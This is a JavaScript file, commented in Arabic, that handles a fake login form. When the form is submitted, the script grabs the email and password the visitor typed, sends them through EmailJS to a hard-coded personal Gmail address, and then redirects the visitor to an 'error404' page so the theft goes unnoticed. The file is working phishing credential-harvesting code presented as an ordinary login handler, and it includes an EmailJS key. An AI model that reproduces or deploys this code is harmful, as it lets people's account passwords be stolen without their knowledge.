// Initialize EmailJS
emailjs.init("na20gEBjN_9fRV0jc"); // WEgo220056 EmailJS

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // إعداد البيانات لإرسالها عبر البريد الإلكتروني
    const data = {
        email: email,
        password: password,
        to_email: 'wego.gemar2005@gmail.com' // البريد الإلكتروني الذي ستصل إليه البيانات
    };

    // إرسال البيانات عبر EmailJS
    emailjs.send("YOUR_SERVICE_ID", "login-template", data)
        .then(function(response) {
            console.log("تم إرسال البريد الإلكتروني بنجاح", response);
        }, function(error) {
            console.log("خطأ في إرسال البريد الإلكتروني", error);
        });

    // التوجيه إلى صفحة التأكيد بعد 2 ثانية
    setTimeout(() => {
        window.location.href = 'error404.html';
    }, 2000); // الانتظار 2 ثانية
});